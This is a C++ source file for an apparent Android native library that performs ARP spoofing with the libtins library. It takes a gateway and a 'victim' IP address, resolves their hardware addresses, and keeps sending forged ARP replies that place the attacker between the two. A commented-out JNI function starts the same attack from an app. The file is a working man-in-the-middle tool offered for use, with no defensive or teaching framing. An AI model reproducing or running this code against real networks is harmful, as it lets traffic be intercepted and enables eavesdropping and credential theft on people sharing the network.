#include <jni.h>
#include <string>
#include <iostream>
#include <stdexcept>
#include <cstdlib>
#include <poll.h>
#include <atomic>
#include <unistd.h>
#include <bits/unique_ptr.h>

#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>


#include <android/log.h>
#define  LOG_TAG    "NATIVE"
#define  LOGE(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)
#define  LOGW(...)  __android_log_print(ANDROID_LOG_WARN,LOG_TAG,__VA_ARGS__)
#define  LOGD(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define  LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)


using std::cout;
using std::runtime_error;
using std::endl;

using namespace Tins;

std::atomic<bool> spoofing(true);

void try_get_input(){
    std::string line;
    // poll.h is not platform independent
    struct pollfd poller;
    poller.fd = STDIN_FILENO;
    poller.events = POLLIN;
    poller.revents = 0;
    // Poll one descriptor with a five second timeout
    int rc = poll(&poller, 1, 5000);
    if (rc < 0) cout << "poll error" << endl;
    else if (rc == 0) return;
    else {
        // There is input to be read on standard input
        std::cin >> line;
        if (line == "quit") spoofing = false;
    }
}

void do_arp_spoofing(
        NetworkInterface iface,
        IPv4Address gw,
        IPv4Address victim)
{
    PacketSender sender(iface, 8);
    EthernetII::address_type gw_hw, victim_hw;

    // Get own interface hardware address.
    HWAddress<6> own_hw = iface.info().hw_addr;
    cout << "Using own hw address: " << own_hw << endl;
    // Resolves gateway's hardware address.
    gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
    cout << "Using gateway hw address: " << gw_hw << endl;
    //std::this_thread::sleep_for(std::chrono::milliseconds(500));
    // Resolves victim's hardware address.
    victim_hw = Utils::resolve_hwaddr(iface, victim, sender);
    cout << "Using victim hw address: " << victim_hw << endl;
    // We tell the gateway that the victim is at our hw address,
    // and tell the victim that the gateway is at our hw address
    ARP gw_arp(gw, victim, gw_hw, own_hw),
            victim_arp(victim, gw, victim_hw, own_hw);
    // We are "replying" ARP requests
    gw_arp.opcode(ARP::REPLY);
    victim_arp.opcode(ARP::REPLY);

    // The packet we'll send to the gateway and victim.
    // We include our hw address as the source address
    // in ethernet layer, to avoid possible packet dropping
    // performed by any routers.
    EthernetII to_gw = EthernetII(gw_hw, own_hw) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw, own_hw) / victim_arp;
    cout << "Spoofing... (^_^)" << endl;
    while (spoofing.load()) {
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(5);
        //try_get_input();
    }
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "Usage: " <<* argv << " <Gateway> <Victim>" << endl;

        return 1;
    }
    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer.
        gw     = argv[1];
        victim = argv[2];
    }
    catch (...) {
        cout << "Invalid IP found (-_-)" << endl;
        return 2;
    }
    try {
        // Get the interface which will be the gateway for our requests and arp spoof
        NetworkInterface iface(gw);
        do_arp_spoofing(iface, gw, victim);
        cout << "Exiting..." << endl;
        return 0;
    }
    catch (runtime_error& ex) {
        cout << "Runtime error: " << ex.what() << endl;
        return 7;
    }
}

/*

volatile static bool spoofing = false;

EthernetII::address_type arp_resolve(
        NetworkInterface iface,
        IPv4Address to_resolve,
        PacketSender &sender)
{
    auto info = iface.info();
    EthernetII eth = ARP::make_arp_request(to_resolve, info.ip_addr, info.hw_addr);
    // Send and recieve response
    std::unique_ptr<PDU> response(sender.send_recv(eth, iface));
    if (response){
        const ARP &arp = response->rfind_pdu<ARP>();
        return arp.sender_hw_addr();
    }
    else{
        throw std::runtime_error(std::string("Failed to resolve") + to_resolve.to_string());
    }
}

extern "C" JNIEXPORT jint JNICALL Java_com_nibiru_arpspoof_MainActivity_toggleArpSpoofThread(
        JNIEnv *env,
        jobject instance,
        jstring gateway_,
        jstring target_)
{
    // toggle spoofing flag, and return if we are stopping (thread should gracefully exit)
    spoofing = !spoofing;
    LOGD("SPOOF: %d\n", spoofing);
    if (!spoofing) return 0;
    LOGD("Continuing...\n");
    // else start spoofing thread
    const char *gateway = env->GetStringUTFChars(gateway_, 0);
    const char *target = env->GetStringUTFChars(target_, 0);
    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer.
        gw     = gateway;
        victim = target;
    }
    catch (...) {
        cout << "Invalid ip found...\n";
        return 2;
    }
    LOGD("GW: %s\n", gw.to_string().c_str());
    LOGD("T: %s\n", victim.to_string().c_str());
    // Get the interface which will be the gateway and spin arp spoofing thread
    try {
        NetworkInterface iface(gw);
        std::thread(do_arp_spoofing, iface, gw, victim);
    }
    catch (runtime_error& ex) {
        cout << "Runtime error: " << ex.what() << endl;
        env->ReleaseStringUTFChars(gateway_, gateway);
        env->ReleaseStringUTFChars(target_, target);
        return 7;
    }
    env->ReleaseStringUTFChars(gateway_, gateway);
    env->ReleaseStringUTFChars(target_, target);
    return 0;
}
*/